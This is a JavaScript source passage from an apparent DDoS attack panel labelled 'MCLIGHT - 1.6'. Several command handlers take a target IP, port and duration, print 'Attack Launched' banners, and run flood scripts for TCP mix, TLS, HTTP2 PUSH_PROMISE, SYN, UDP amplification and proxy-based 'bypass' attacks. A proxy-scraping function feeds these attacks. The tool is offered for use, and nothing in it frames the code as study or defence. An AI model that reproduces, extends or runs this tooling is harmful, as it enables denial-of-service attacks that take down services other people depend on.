      ⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
		TCP Mix Attack Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Port     » ${port}
╠ Duration » ${duration}
╠ Methods  » TCP Mix Attack
╠ Type 1   » Raw TCP Flood
╠ Type 2   » TLS Flood
╠ Type 3   » HTTP2 PUSH_PROMISE
╠ Type 4   » TCP SYN Flood
╚ Type 5   » TCP Keep-Alive`)
  } catch (error) {
    console.log(`[X] Oops Something Went Wrong`)
  }

  const metode = path.join(__dirname, `/lib/cache/tcp-mix`);
  exec(`node ${metode} ${target} ${port} ${duration}`)
  sigma()
};

async function udp_amp(args) {
  if (args.length < 3) {
    console.log(`[?] Example: udp-amp <target> <port> <duration>
udp-amp 123.456.78.910 53 300`);
    sigma();
    return
  }
  const [target, port, duration] = args
  try {
    console.clear()
    console.log(`


      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
      ⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
      ⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
      ⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
      ⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
		UDP Amplification Attack Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╚ Methods  » UDP Amplification`)
  } catch (error) {
    console.log(`[X] Oops Something Went Wrong`)
  }

  const metode = path.join(__dirname, `/lib/cache/udp-amp`);
  exec(`node ${metode} ${target} ${port} ${duration}`)
  sigma()
};

async function tcp_adv(args) {
  if (args.length < 3) {
    console.log(`[?] Example: tcp-adv <target> <port> <duration>
tcp-adv 123.456.78.910 80 300`);
    sigma();
    return
  }
  const [target, port, duration] = args
  try {
    console.clear()
    console.log(`


      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
      ⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
      ⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
      ⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
      ⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
		TCP Advanced Attack Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╚ Methods  » TCP Advanced`)
  } catch (error) {
    console.log(`[X] Oops Something Went Wrong`)
  }

  const metode = path.join(__dirname, `/lib/cache/tcp-adv`);
  exec(`node ${metode} ${target} ${port} ${duration}`)
  sigma()
};

async function udp_bypass(args) {
  if (args.length < 3) {
    console.log(`[?] Example: udp-bypass <target> <port> <duration>
udp-bypass 123.456.78.910 53 300`);
    sigma();
    return
  }
  const [target, port, duration] = args;
  const proxyPath = path.join(__dirname, '/socks5.txt');
  
  if (!fs.existsSync(proxyPath)) {
    console.log('[X] SOCKS5 Proxy File Not Found. Please Run update-proxy First.');
    sigma();
    return;
  }
  
  try {
    console.clear()
    console.log(`


      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
      ⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
      ⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
      ⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
      ⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
		UDP Bypass Attack Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╚ Methods  » UDP Bypass with SOCKS5`)
  } catch (error) {
    console.log(`[X] Oops Something Went Wrong`)
  }

  const metode = path.join(__dirname, `/lib/cache/udp-bypass`);
  exec(`node ${metode} ${target} ${port} ${duration} ${proxyPath}`)
  sigma()
};

async function tcp_bypass(args) {
  if (args.length < 3) {
    console.log(`[?] Example: tcp-bypass <target> <port> <duration>
tcp-bypass 123.456.78.910 80 300`);
    sigma();
    return
  }
  const [target, port, duration] = args;
  const proxyPath = path.join(__dirname, '/socks5.txt');
  
  if (!fs.existsSync(proxyPath)) {
    console.log('[X] SOCKS5 Proxy File Not Found. Please Run update-proxy First.');
    sigma();
    return;
  }
  
  try {
    console.clear()
    console.log(`


      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
      ⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
      ⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
      ⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
      ⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
		TCP Bypass Attack Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╚ Methods  » TCP Bypass with SOCKS5`)
  } catch (error) {
    console.log(`[X] Oops Something Went Wrong`)
  }

  const metode = path.join(__dirname, `/lib/cache/tcp-bypass`);
  exec(`node ${metode} ${target} ${port} ${duration} ${proxyPath}`)
  sigma()
};

async function scrapeAllProxies() {
    let allProxies = new Set();
    let count = 0;
    
    try {
        console.log(`[+] Starting proxy scraping from ${raw_proxy_sites.length} sources...`);
        for (const source of raw_proxy_sites) {
            try {
                const response = await axios.get(source);
                const proxies = response.data.split('\n').filter(line => line.trim());
                proxies.forEach(proxy => allProxies.add(proxy.trim()));
                count++;
                if (count % 5 === 0) {
                    console.log(`[!] Progress: ${count}/${raw_proxy_sites.length} sources`);
                }
            } catch (error) {
                console.log(`[-] Failed to scrape from source #${count + 1}`);
            }
        }

        const uniqueProxies = [...allProxies].join('\n');
        fs.appendFileSync('proxy.txt', '\n' + uniqueProxies);
        console.log(`[+] Total unique proxies added: ${allProxies.size}`);
        return allProxies.size;
    } catch (error) {
        console.error('[-] Error in proxy scraping:', error.message);
        return 0;
    }
}
